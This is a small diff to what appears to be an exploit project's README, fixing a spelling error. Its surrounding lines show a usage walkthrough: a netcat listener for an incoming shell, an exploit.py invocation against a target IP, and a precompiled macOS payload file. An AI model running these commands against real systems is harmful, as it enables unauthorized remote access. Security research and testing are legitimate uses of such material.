@@ -42,7 +42,7 @@ $ nc -p 23333 -l
 # Second terminal to exploit target
 $ python3 ./exploit.py -lhost 192.168.71.136 --rhost 192.168.71.135
 ```
-If the target is macOS, you **should not to** compile the module on Linux! As gcc do not support MACH-O format. If you are a mac user, macOS payload compilSation works.
+If the target is macOS, you **should not to** compile the module on Linux! As gcc do not support MACH-O format. If you are a mac user, macOS payload compilation works.
 
 A precompiled version is in the directory. The `mac_payload.so`.
 
